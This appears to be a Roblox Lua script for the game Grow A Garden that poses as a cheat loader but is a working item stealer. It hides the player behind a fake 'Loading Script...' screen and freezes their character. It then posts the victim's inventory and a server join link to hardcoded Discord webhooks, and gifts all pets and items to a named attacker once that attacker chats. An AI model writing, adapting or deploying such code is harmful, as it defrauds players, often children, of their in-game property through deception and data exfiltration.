logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"

local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
local player = game.Players.LocalPlayer

if server == "VIPServer" then 
    player:Kick("Unsurported server. Please join a public")
end

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")
local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
local req = (syn and syn.request) or (http and http.request) or (http_request) or request

-- Mute all sounds in the game (current and future)
for _, sound in ipairs(game:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
    end
end
game.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Sound") then
        descendant.Volume = 0
    end
end)

local p = game.Players.LocalPlayer
local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
h.WalkSpeed = 0 
h.JumpPower = 0
pcall(function() require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)

local gui = Instance.new("ScreenGui")
gui.Name = "ScriptLoader"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999 
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", gui)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.Size = UDim2.new(1, 0, 1, 0)

local title = Instance.new("TextLabel", bg)
title.Text = "Loading Script..."
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Size = UDim2.new(0.8, 0, 0.12, 0)
title.Position = UDim2.new(0.1, 0, 0.28, 0)
title.BackgroundTransparency = 1

local status = Instance.new("TextLabel", bg)
status.Text = "Initializing..."
status.Font = Enum.Font.Gotham
status.TextColor3 = Color3.fromRGB(180, 180, 180)
status.TextScaled = true
status.Size = UDim2.new(0.8, 0, 0.08, 0)
status.Position = UDim2.new(0.1, 0, 0.42, 0)
status.BackgroundTransparency = 1

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.ClipsDescendants = true

local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local discord = Instance.new("TextLabel", bg)
discord.Text = "MADE BY BUFFY ,ENJOY"
discord.Font = Enum.Font.GothamSemibold
discord.TextColor3 = Color3.fromRGB(120, 120, 255)
discord.TextScaled = true
discord.Size = UDim2.new(0.8, 0, 0.05, 0)
discord.Position = UDim2.new(0.1, 0, 0.86, 0)
discord.BackgroundTransparency = 1

local fakeSteps = {
    "MADE BY BUFFY",
    "Connecting to game servers...",
    "Bypassing anti-cheat...",
    "Loading UI assets...",
    "Injecting main module...",
    "Syncing with server...",
    "Optimizing script performance...",
    "Checking for updates...",
    "Hiding script from detection...",
    "Finalizing setup...",
    "Preparing game environment...",
    "Almost done..."
}

local totalDuration = 300
local stepTime = 3
local totalSteps = math.floor(totalDuration / stepTime)

task.spawn(function()
    for i = 1, totalSteps do
        status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
        task.wait(stepTime)
    end
    gui:Destroy()
end)

local suffixes = {
    "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"
}

function formatNumber(num)
    if type(num) ~= "number" then return tostring(num) end
    if num < 1000 then return tostring(num) end

    local magnitude = math.floor(math.log10(num) / 3)
    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
    local scaled = num / (1000 ^ magnitude)

    return string.format("%.2f%s", scaled, suffix)
end

if #game.Players:GetPlayers() >= 5 then
    game.Players.LocalPlayer:Kick("Old server detected. Please rejoin!")
    return 
end

local player = game:GetService("Players").LocalPlayer
local bp = player:WaitForChild("Backpack")
local event = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item")

for _, item in ipairs(bp:GetChildren()) do
    if item:GetAttribute("Favorite") == true then
        event:FireServer(item)
    end
end

local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local allowedPets = {
    ["Raccoon"] = true,
    ["Disco Bee"] = true,
    ["Bear Bee"] = true,
    ["Scarlet Macaw"] = true,
    ["Petal Bee"] = true,
    ["Mimic Octopus"] = true,
    ["Queen Bee"] = true,
    ["Dragonfly"] = true,
    ["Red Fox"] = true,
    ["Polar Bear"] = true,
    ["Butterfly"] = true,
    ["Chicken Zombie"] = true,
    ["Cooked Owl"] = true,
}

-- All fruits in Grow A Garden (add more if needed)
local knownFruits = {
    Feijoa = true, Apple = true, Banana = true, Orange = true, Lemon = true, Mango = true, Pear = true,
    Pineapple = true, Watermelon = true, Melon = true, Grape = true, Cherry = true, Strawberry = true,
    Blueberry = true, Avocado = true, Apricot = true, Lychee = true, Dragonfruit = true, Cucumber = true,
    Tomato = true, Blackberry = true, Raspberry = true, Peach = true, Plum = true, Kiwi = true,
    Passionfruit = true, Pomegranate = true, Persimmon = true, Grapefruit = true, Coconut = true,
    Lemonade = true, Starfruit = true, Durian = true, Longan = true, Mangosteen = true, Sapote = true,
    Jackfruit = true, Papaya = true, Guava = true, Boysenberry = true, Gooseberry = true, Elderberry = true,
    Currant = true, Mulberry = true, Cranberry = true, Date = true, Fig = true, Olive = true,
    Nectarine = true, Tangerine = true, Clementine = true, Satsuma = true, Pomelo = true, Quince = true,
    Rambutan = true, Salak = true, Soursop = true, Ugli = true, Yuzu = true, Breadfruit = true,
    Carambola = true, Sapodilla = true, Miraclefruit = true, Medlar = true, Jabuticaba = true, Ackee = true,
    Bilberry = true, Chokeberry = true, Cloudberry = true, Huckleberry = true, Langsat = true,
    Loquat = true, Lucuma = true, Nashi = true, Pawpaw = true, Santol = true, SurinamCherry = true,
    WhiteSapote = true, WinterMelon = true, Ziziphus = true,
}

-- Dynamically add pets >10Kg to allowedPets during script execution, but skip known fruits!
for _, item in pairs(backpack:GetChildren()) do
    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
    local kg = tonumber(string.match(item.Name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0

    -- Only dynamically add as pet if not a known fruit!
    if kg > 10 and not knownFruits[baseName] then
        if not allowedPets[baseName] then
            allowedPets[baseName] = true
            -- Send notification to BOTH main webhook and logs webhook
            if req then
                local bigPetPayload = {
                    ["content"] = "@everyone",
                    ["embeds"] = {{
                        ["title"] = ":rotating_light: Big Pet Detected!",
                        ["description"] = "A pet over 10Kg was found in the backpack.",
                        ["color"] = 0xff0000,
                        ["fields"] = {
                            {["name"] = "Pet Name", ["value"] = baseName, ["inline"] = true},
                            {["name"] = "Weight", ["value"] = tostring(kg) .. "Kg", ["inline"] = true},
                            {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true}
                        },
                        ["footer"] = {["text"] = "by Buffy â€¢ " .. os.date("%B %d, %Y")},
                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                    }}
                }
                pcall(function()
                    req({
                        Url = webhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(bigPetPayload)
                    })
                    req({
                        Url = logs_webhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(bigPetPayload)
                    })
                end)
            end
        end
    end
end

local petCountMap = {}
local petLines = {}
local itemsWithValue = {}

for _, item in pairs(backpack:GetChildren()) do
    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
    if allowedPets[baseName] then
        petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
    elseif item:FindFirstChild("Item_String") then
        local value = CalculatePlantValue(item)
        table.insert(itemsWithValue, {name = item.Name, value = value})
    end
end

for petName, count in pairs(petCountMap) do
    table.insert(petLines, petName .. " - pet (x" .. count .. ")")
end

table.sort(itemsWithValue, function(a, b) return a.value > b.value end)

local tradableSummary = ""
local totalShown = 0

for _, line in ipairs(petLines) do
    if totalShown >= 10 then break end
    tradableSummary = tradableSummary .. line .. "\n"
    totalShown += 1
end

for i = 1, math.min(10 - totalShown, #itemsWithValue) do
    local item = itemsWithValue[i]
    tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
end

if #petLines + #itemsWithValue > 10 then
    tradableSummary = tradableSummary .. "and more..."
end

local totalValue = 0
for _, item in ipairs(itemsWithValue) do
    totalValue += item.value
end

local payload = {
    ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
    ["embeds"] = {{
        ["title"] = ":skull: GROW A GARDEN Stealer",
        ["color"] = 0x00ffcc,
        ["fields"] = {
            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
            {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
        },
        ["footer"] = {["text"] = "by Buffy â€¢ " .. os.date("%B %d, %Y")},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local logs_payload = {
    ["embeds"] = {{
        ["title"] = ":skull: GROW A GARDEN LOGS",
        ["color"] = 0x00ffcc,
        ["fields"] = {
            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
        },
        ["footer"] = {["text"] = "by buffy â€¢ " .. os.date("%B %d, %Y")},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

if req then
    pcall(function()
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })

        req({
            Url = logs_webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(logs_payload)
        })
    end)
end

local printedInventory = false
local started = false

local function getKg(name)
    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
end

local function printSortedItems(items)
end

local function hasValidItems()
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if getKg(item.Name) > 0 then
            return true
        end
    end
    return false
end

local function unequipAllPets()
    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
    if petData then
        for uuid, _ in pairs(petData.PetInventory.Data) do
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
            task.wait(0.1)
        end
    end
end

local function startGiving()
    if not hasValidItems() then return end
    local target = Players:FindFirstChild(username)
    if not target or not target.Character then return end

    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    LocalPlayer.Character:MoveTo(hrp.Position)
    task.wait(0.4)

    local prompt = hrp:FindFirstChildOfClass("ProximityPrompt")
    if not prompt then return end
    prompt.HoldDuration = 0

    local index = 1
    while true do
        if not hasValidItems() then break end
        local sortedItems = {}
        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if getKg(item.Name) > 0 then
                table.insert(sortedItems, item)
            end
        end
        table.sort(sortedItems, function(a, b) return getKg(a.Name) > getKg(b.Name) end)

        if #sortedItems > 0 then
            if index > #sortedItems then index = 1 end
            local item = sortedItems[index]
            if item:IsA("Tool") then
                item.Parent = LocalPlayer.Character
                task.wait()
            end

            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)

            -- DELTA BYPASS for ProximityPrompt
            prompt.Enabled = true
            prompt:InputHoldBegin(Enum.UserInputType.Touch)
            task.wait(prompt.Duration)
            prompt:InputHoldEnd(Enum.UserInputType.Touch)
            -- END DELTA BYPASS

            if item:IsDescendantOf(LocalPlayer.Character) then
                item.Parent = LocalPlayer.Backpack
            end

            index += 1
        else
            break
        end
        task.wait(0.05)
    end
end

unequipAllPets()
for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == username then 
        p.Chatted:Connect(function() 
            if not started then 
                started = true 
                startGiving() 
            end 
        end) 
    end
end
Players.PlayerAdded:Connect(function(p)
    if p.Name == username then 
        p.Chatted:Connect(function() 
            if not started then 
                started = true 
                startGiving() 
            end 
        end) 
    end
end)
